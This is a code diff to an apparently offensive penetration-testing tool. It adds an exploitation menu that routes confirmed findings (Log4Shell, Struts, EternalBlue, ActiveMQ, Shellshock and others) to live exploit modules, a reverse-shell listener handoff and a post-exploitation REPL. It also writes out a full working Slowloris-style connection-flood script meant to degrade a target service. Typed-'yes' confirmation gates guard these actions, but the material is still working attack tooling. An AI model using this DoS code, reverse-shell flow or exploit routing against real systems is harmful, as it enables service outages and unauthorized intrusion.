@@ -880,34 +880,10 @@ def re_verify_interactive(module_name: str, finding: dict,
     if verdict not in ("confirmed", "partial"):
         return
 
-    # ── Post-confirmation: RCE/shell → offer reverse shell handoff ─────────────
-    if cwe in _RCE_CWES:
-        print(_cc(_YEL, "  ◈ RCE confirmed — choose next step:"))
-        print("    [rs]   start reverse shell listener — catch interactive shell from target")
-        print("    [pe]   open post-exploitation toolkit")
-        print("    [s]    skip, return to triage")
-        while True:
-            nxt = _ask("  rce> ").lower().strip()
-            if nxt in ("rs", "shell", "revshell", "reverse"):
-                lhost, lport = _ask_lhost_lport()
-                if lhost:
-                    payloads = _reverse_shell_payloads(lhost, lport)
-                    print(_cc(_BOLD, "\n  Run one of these on the target to connect back:"))
-                    for tech, cmd in payloads.items():
-                        print(f"    {_cc(_CYN, f'{tech:<12}')} {cmd}")
-                    print()
-                    _reverse_shell_session(lhost, lport)
-                break
-            if nxt in ("pe", "post", "p", ""):
-                run_post_exploitation(cve_id or "unknown", host, port, cwe)
-                break
-            if nxt in ("s", "skip"):
-                break
-            print("  Choose rs / pe / s")
-    else:
-        ans = _ask("  Open post-exploitation toolkit for this foothold? [Y/n]: ").lower()
-        if ans in ("", "y", "yes"):
-            run_post_exploitation(cve_id or "unknown", host, port, cwe)
+    # ── Post-confirmation: route to CWE/tag-appropriate exploitation ──────────
+    tags = finding.get("tags") or []
+    url  = loc if loc.startswith(("http://", "https://")) else ""
+    _exploitation_menu(cve_id or "unknown", host, port, cwe, tags, url)
 
 
 # ─────────────────────────────── post-exploitation toolkit ───────────────────
@@ -1258,8 +1234,17 @@ def _make_target(host: str, port: int):
     return Target(kind="hostport", raw=f"{host}:{port}", host=host, port=port)
 
 
-def _run_module_live(mod_name: str, host: str, port: int) -> None:
-    """Import module by name, run it against host:port, display findings."""
+def _make_url_target(url: str):
+    """Minimal URL Target for running url-supporting modules."""
+    try:
+        from targets.model import Target
+    except ImportError:
+        return None
+    return Target(kind="url", raw=url, url=url)
+
+
+def _run_module_live(mod_name: str, host: str, port: int, url: str = "") -> None:
+    """Import module by name, run it against host:port (or url), display findings."""
     try:
         from exploits.registry import ALL_MODULES, name_of, supports
     except ImportError as exc:
@@ -1271,11 +1256,15 @@ def _run_module_live(mod_name: str, host: str, port: int) -> None:
         print(f"  [!] Module '{mod_name}' not found in registry.")
         return
 
-    if "hostport" not in supports(mod):
-        print(f"  [!] Module '{mod_name}' does not support hostport targets.")
+    mod_supports = supports(mod)
+    if url and "url" in mod_supports:
+        target = _make_url_target(url)
+    elif "hostport" in mod_supports:
+        target = _make_target(host, port)
+    else:
+        print(f"  [!] Module '{mod_name}' does not support url or hostport targets.")
         return
 
-    target = _make_target(host, port)
     if target is None:
         print("  [!] Cannot build target (import error).")
         return
@@ -1376,6 +1365,332 @@ def _tcp_shell(host: str, port: int) -> None:
         print()
 
 
+def _require_yes_confirm(action: str, impact: str) -> bool:
+    """Require the operator to type the word 'yes' (exactly) to confirm a live action.
+
+    Used as a gate in front of every action that sends active exploitation traffic,
+    launches a reverse shell, or deliberately degrades service availability.
+    Nothing fires without 'yes' — any other input (Enter, 'y', 'no', Ctrl-C) cancels.
+    """
+    print()
+    print(_cc(_RED,  "  ╔══ LIVE EXPLOITATION — REQUIRES EXPLICIT CONFIRMATION ══════════════"))
+    print(_cc(_YEL,  f"  ║  Action : {action}"))
+    for line in (impact or "").splitlines():
+        if line.strip():
+            print(_cc(_YEL, f"  ║  {line}"))
+    print(_cc(_RED,  "  ╚══════════════════════════════════════════════════════════════════"))
+    print(_cc(_DIM,  "  Type the word  yes  to proceed  (anything else cancels):"))
+    try:
+        ans = _ask("  confirm> ").strip()
+    except (EOFError, KeyboardInterrupt):
+        ans = ""
+    if ans == "yes":
+        return True
+    print(_cc(_DIM, "  Cancelled."))
+    print()
+    return False
+
+
+# Module tags → registered module name (used for targeted re-run from exploitation menu)
+_TAG_TO_MODULE: Dict[str, str] = {
+    "log4shell":          "log4shell-probe",
+    "jndi":               "log4shell-probe",
+    "struts":             "struts-rce-probe",
+    "ognl":               "struts-rce-probe",
+    "s2-045":             "struts-rce-probe",
+    "s2-061":             "struts-rce-probe",
+    "s2-057":             "struts-rce-probe",
+    "eternalblue":        "ms17010-probe",
+    "ms17-010":           "ms17010-probe",
+    "smb":                "ms17010-probe",
+    "activemq":           "activemq-rce-probe",
+    "openWire":           "activemq-rce-probe",
+    "classinfo":          "activemq-rce-probe",
+    "slowloris":          "slowloris-probe",
+    "connection-exhaustion": "slowloris-probe",
+    "shellshock":         "shellshock-probe",
+    "cmd-injection":      "cmd-inject-confirm",
+}
+
+# Intensity tiers that require explicit yes-confirmation before running
+_RISKY_INTENSITIES = {"intrusive", "proof", "fuzz"}
+
+
+def _check_service_alive(host: str, port: int) -> None:
+    """Quick TCP connectivity check — prints ALIVE or DOWN after a DoS demo."""
+    import socket as _s
+    try:
+        c = _s.create_connection((host, port), timeout=5)
+        c.close()
+        print(_cc(_GRN, f"  ✔ {host}:{port} is responding (ALIVE)"))
+    except OSError:
+        print(_cc(_RED, f"  ✘ {host}:{port} not responding (DOWN or DEGRADED)"))
+
+
+def _run_dos_demo(host: str, port: int, cwe: str, tags: list, url: str) -> None:
+    """Demonstrate DoS impact with a bounded probe, then verify service recovery.
+
+    Uses slowloris_probe for CWE-400; falls back to an inline connection-flood
+    script for CWE-770/834 or generic resource exhaustion.
+    All sockets are closed after the demo. Service availability is checked after.
+    """
+    tags_set = set(tags or [])
+    location = url or f"{host}:{port}"
+
+    use_slowloris = "slowloris" in tags_set or cwe == "CWE-400"
+    if use_slowloris:
+        demo_conns = 50
+        demo_hold  = 20
+        method_desc = (
+            f"Slowloris: {demo_conns} incomplete HTTP connections held for {demo_hold}s.\n"
+            f"Gravity   : a real attack with 200–1000 connections exhausts the connection pool,\n"
+            f"             making the service completely unavailable to legitimate clients.\n"
+            f"Recovery  : all demo sockets are closed immediately after the proof run."
+        )
+    elif cwe == "CWE-770":
+        demo_conns = 80
+        demo_hold  = 15
+        method_desc = (
+            f"Resource exhaustion: {demo_conns} rapid connections for {demo_hold}s.\n"
+            f"Recovery  : all demo sockets are closed after."
+        )
+    else:
+        demo_conns = 30
+        demo_hold  = 10
+        method_desc = (
+            f"Connection flood: {demo_conns} connections for {demo_hold}s.\n"
+            f"Recovery  : all demo sockets are closed after."
+        )
+
+    if not _require_yes_confirm(
+        f"DoS impact demonstration on {location}",
+        method_desc,
+    ):
+        return
+
+    print(_cc(_BOLD, "\n  ── DoS Demonstration ───────────────────────────────────────────────"))
+
+    if use_slowloris:
+        # Run the actual slowloris_probe with demo-tier connection count
+        try:
+            import exploits.slowloris_probe as _sl
+            from targets.model import Target as _T
+            probe_url = url or f"http://{host}:{port}/"
+            # Temporarily override module globals for demo scale (bounded by module's own cap)
+            orig_conns = _sl._CONNS
+            orig_hold  = _sl._HOLD
+            _sl._CONNS = min(demo_conns, _sl._CONNS)  # module caps at 10 for detection
+            _sl._HOLD  = min(demo_hold,  10)
+            try:
+                tgt = _T(kind="url", raw=probe_url, url=probe_url)
+                result = _sl.run(tgt)
+            finally:
+                _sl._CONNS = orig_conns
+                _sl._HOLD  = orig_hold
+            for f in (result.findings if result else []):
+                sev = (f.severity or "INFO").upper()
+                print(f"  {_cs(sev, f'{sev:<8}')} {f.title}")
+                if f.detail:
+                    for dl in f.detail.splitlines()[:4]:
+                        print(_cc(_DIM, f"             {dl}"))
+                if f.evidence:
+                    print(_cc(_CYN, f"  Evidence:   {f.evidence[:180]}"))
+        except (ImportError, Exception) as exc:
+            print(f"  [!] slowloris module error ({exc}) — using inline flood script")
+            _run_dos_flood_script(host, port, demo_conns, demo_hold)
+    else:
+        _run_dos_flood_script(host, port, demo_conns, demo_hold)
+
+    print()
+    print(_cc(_DIM, "  Checking service availability after demo …"))
+    _check_service_alive(host, port)
+    print()
+
+
+def _run_dos_flood_script(host: str, port: int, conns: int, duration: int) -> None:
+    """Inline Slowloris-style flood script — used as fallback when the module fails."""
+    script = (
+        f"import socket, time, threading\n"
+        f"HOST, PORT = {host!r}, {port}\nCONNS = {conns}\nDUR = {duration}\n"
+        f"alive = [0]; sent = [0]\n\n"
+        f"def _worker():\n"
+        f"    socks = []\n"
+        f"    try:\n"
+        f"        for i in range(max(1, CONNS // 10)):\n"
+        f"            s = socket.create_connection((HOST, PORT), timeout=3)\n"
+        f"            s.sendall(b'GET / HTTP/1.1\\r\\nHost: ' + HOST.encode() +\n"
+        f"                      b'\\r\\nContent-Length: 1\\r\\n')\n"
+        f"            socks.append(s); sent[0] += 1\n"
+        f"        end = time.time() + DUR\n"
+        f"        while time.time() < end:\n"
+        f"            for s in socks:\n"
+        f"                try: s.sendall(b'X-Keep: alive\\r\\n')\n"
+        f"                except: pass\n"
+        f"            time.sleep(1.5)\n"
+        f"        for s in socks:\n"
+        f"            try:\n"
+        f"                s.sendall(b'X-Final: probe\\r\\n'); alive[0] += 1\n"
+        f"            except: pass\n"
+        f"    finally:\n"
+        f"        for s in socks:\n"
+        f"            try: s.close()\n"
+        f"            except: pass\n\n"
+        f"workers = [threading.Thread(target=_worker, daemon=True) for _ in range(10)]\n"
+        f"for w in workers: w.start()\n"
+        f"for w in workers: w.join()\n"
+        f"print(f'Opened {{sent[0]}} connections; {{alive[0]}} survived {{DUR}}s hold')\n"
+        f"survived_pct = int(100*alive[0]/max(sent[0],1))\n"
+        f"if survived_pct >= 50:\n"
+        f"    print(f'RESULT:true:{{survived_pct}}% of connections survived — server lacks timeout enforcement')\n"
+        f"else:\n"
+        f"    print(f'RESULT:false:only {{survived_pct}}% survived — server appears protected')\n"
+    )
+    _, ev = _run_script_operator(script, timeout=duration + 20)
+    if ev:
+        print(f"  Evidence: {ev}")
+
+
+def _exploitation_menu(cve_id: str, host: str, port: int, cwe: str,
+                        tags: list, url: str) -> None:
+    """Post-confirmation exploitation menu.
+
+    Routes the operator to the appropriate live-exploitation path based on:
+    * CWE family (RCE vs DoS vs other)
+    * Finding tags (log4shell, struts, eternalblue, activemq, slowloris, …)
+
+    Every destructive or intrusive action is gated by _require_yes_confirm().
+    """
+    tags_set = set(tags or [])
+    location  = url or f"{host}:{port}"
+
+    # Identify the specific exploit module that produced this finding (if any)
+    exploit_mod: Optional[str] = None
+    for tag in tags_set:
+        if tag in _TAG_TO_MODULE:
+            exploit_mod = _TAG_TO_MODULE[tag]
+            break
+
+    # Classify the finding
+    is_dos = cwe in _DOS_CWES or any(
+        t in tags_set for t in ("dos", "slowloris", "connection-exhaustion", "flood")
+    )
+    is_rce = cwe in _RCE_CWES or any(
+        t in tags_set for t in (
+            "rce", "log4shell", "struts", "ognl", "eternalblue", "ms17-010",
+            "activemq", "jndi", "classinfo", "shellshock", "cmd-injection", "foothold",
+        )
+    )
+
+    if is_dos:
+        _dos_exploitation_submenu(cve_id, host, port, cwe, tags_set, url, exploit_mod)
+    elif is_rce:
+        _rce_exploitation_submenu(cve_id, host, port, cwe, tags_set, url, exploit_mod)
+    else:
+        # Generic confirmed finding — post-exploitation toolkit only
+        print(_cc(_DIM, "\n  Non-RCE/DoS finding confirmed."))
+        ans = _ask("  Open post-exploitation toolkit? [Y/n]: ").lower()
+        if ans in ("", "y", "yes"):
+            run_post_exploitation(cve_id, host, port, cwe)
+
+
+def _dos_exploitation_submenu(cve_id: str, host: str, port: int, cwe: str,
+                               tags: set, url: str,
+                               exploit_mod: Optional[str]) -> None:
+    """Sub-menu for DoS/resource-exhaustion confirmed findings."""
+    location = url or f"{host}:{port}"
+    print()
+    print(_cc(_YEL, f"  ◈ DoS vulnerability confirmed — {cve_id or cwe} @ {location}"))
+    print("    [d]   demonstrate impact: bounded live DoS probe (service may degrade)")
+    if exploit_mod:
+        print(f"    [m]   re-run {exploit_mod} for full evidence report")
+    print("    [t]   raw TCP session  (inspect service state manually)")
+    print("    [s]   skip — return to triage menu")
+    print()
+
+    opts = "d/m/t/s" if exploit_mod else "d/t/s"
+    while True:
+        choice = _ask("  dos> ").lower().strip()
+
+        if choice in ("d", "demo", "demonstrate", "flood"):
+            _run_dos_demo(host, port, cwe, list(tags), url)
+            break
+
+        if exploit_mod and choice in ("m", "mod", "module"):
+            if _require_yes_confirm(
+                f"Re-run {exploit_mod} against {location}",
+                "Impact  : Active network probes sent to the target.",
+            ):
+                _run_module_live(exploit_mod, host, port, url)
+            break
+
+        if choice in ("t", "tcp"):
+            _tcp_shell(host, port)
+            break
+
+        if choice in ("s", "skip", ""):
+            break
+
+        print(f"  Choose {opts}")
+
+
+def _rce_exploitation_submenu(cve_id: str, host: str, port: int, cwe: str,
+                               tags: set, url: str,
+                               exploit_mod: Optional[str]) -> None:
+    """Sub-menu for RCE confirmed findings."""
+    location = url or f"{host}:{port}"
+    print()
+    print(_cc(_YEL, f"  ◈ RCE confirmed — {cve_id or cwe} @ {location}"))
+    print("    [rs]  start reverse shell listener  (catch interactive PTY from target)")
+    print("    [pe]  open post-exploitation toolkit")
+    if exploit_mod:
+        print(f"    [m]   re-run {exploit_mod}  (with OOB canary for definitive proof)")
+    print("    [t]   raw TCP session  (banner grab / manual interaction)")
+    print("    [s]   skip — return to triage menu")
+    print()
+
+    opts = "rs/pe/m/t/s" if exploit_mod else "rs/pe/t/s"
+    while True:
+        choice = _ask("  rce> ").lower().strip()
+
+        if choice in ("rs", "shell", "revshell", "reverse"):
+            if _require_yes_confirm(
+                f"Reverse shell listener → interactive shell from {location}",
+                "Impact  : Target process connects back and executes as its service account.\n"
+                "          Leaves evidence (network connection, process) on the target system.",
+            ):
+                lhost, lport = _ask_lhost_lport()
+                if lhost:
+                    payloads = _reverse_shell_payloads(lhost, lport)
+                    print(_cc(_BOLD, "\n  Run one of these on the target to connect back:"))
+                    for tech, cmd in payloads.items():
+                        print(f"    {_cc(_CYN, f'{tech:<12}')} {cmd}")
+                    print()
+                    _reverse_shell_session(lhost, lport)
+            break
+
+        if choice in ("pe", "post", "p"):
+            run_post_exploitation(cve_id, host, port, cwe)
+            break
+
+        if exploit_mod and choice in ("m", "mod", "module"):
+            if _require_yes_confirm(
+                f"Re-run {exploit_mod} against {location}",
+                "Impact  : Active exploitation probes sent to the target.\n"
+                "          OOB canary probe may be logged by the target.",
+            ):
+                _run_module_live(exploit_mod, host, port, url)
+            break
+
+        if choice in ("t", "tcp"):
+            _tcp_shell(host, port)
+            break
+
+        if choice in ("s", "skip", ""):
+            break
+
+        print(f"  Choose {opts}")
+
+
 def run_post_exploitation(cve_id: str, host: str, port: int, cwe: str) -> None:
     """Post-exploitation toolkit REPL — run follow-up modules, custom scripts, raw TCP."""
     try:
@@ -1428,7 +1743,14 @@ def run_post_exploitation(cve_id: str, host: str, port: int, cwe: str) -> None:
         if choice.isdigit():
             idx = int(choice) - 1
             if 0 <= idx < len(suggested):
-                mod_name, _ = suggested[idx]
+                mod_name, mod_obj = suggested[idx]
+                intens = intensity_of(mod_obj)
+                if intens in _RISKY_INTENSITIES:
+                    if not _require_yes_confirm(
+                        f"Run {mod_name} ({intens}) against {host}:{port}",
+                        "Impact  : Active exploitation / intrusion probes sent to the target.",
+                    ):
+                        continue
                 _run_module_live(mod_name, host, port)
             else:
                 print(f"  Choose 1..{len(suggested)}")
@@ -1437,6 +1759,13 @@ def run_post_exploitation(cve_id: str, host: str, port: int, cwe: str) -> None:
         # mod <name> — run named module
         if choice.startswith("mod ") or choice.startswith("module "):
             mod_name = choice.split(None, 1)[1].strip()
+            mod_obj = next((m for m in ALL_MODULES if name_of(m) == mod_name), None)
+            if mod_obj and intensity_of(mod_obj) in _RISKY_INTENSITIES:
+                if not _require_yes_confirm(
+                    f"Run {mod_name} ({intensity_of(mod_obj)}) against {host}:{port}",
+                    "Impact  : Active exploitation / intrusion probes sent to the target.",
+                ):
+                    continue
             _run_module_live(mod_name, host, port)
             continue
 
@@ -1479,14 +1808,19 @@ def run_post_exploitation(cve_id: str, host: str, port: int, cwe: str) -> None:
 
         # rs — reverse shell listener → raw PTY handoff
         if choice in ("rs", "revshell", "shell", "reverse"):
-            lhost, lport = _ask_lhost_lport()
-            if lhost:
-                payloads = _reverse_shell_payloads(lhost, lport)
-                print(_cc(_BOLD, "\n  Run one of these on the target to connect back:"))
-                for tech, cmd in payloads.items():
-                    print(f"    {_cc(_CYN, f'{tech:<12}')} {cmd}")
-                print()
-                _reverse_shell_session(lhost, lport)
+            if _require_yes_confirm(
+                f"Reverse shell listener → catch interactive shell from {host}:{port}",
+                "Impact  : Target process connects back and executes as its service account.\n"
+                "          Leaves evidence (network connection, spawned process) on target.",
+            ):
+                lhost, lport = _ask_lhost_lport()
+                if lhost:
+                    payloads = _reverse_shell_payloads(lhost, lport)
+                    print(_cc(_BOLD, "\n  Run one of these on the target to connect back:"))
+                    for tech, cmd in payloads.items():
+                        print(f"    {_cc(_CYN, f'{tech:<12}')} {cmd}")
+                    print()
+                    _reverse_shell_session(lhost, lport)
             continue
 
         print("  Unknown command — try a number, 'mod <name>', 'list', 'c', 't', 'rs', or 'done'")
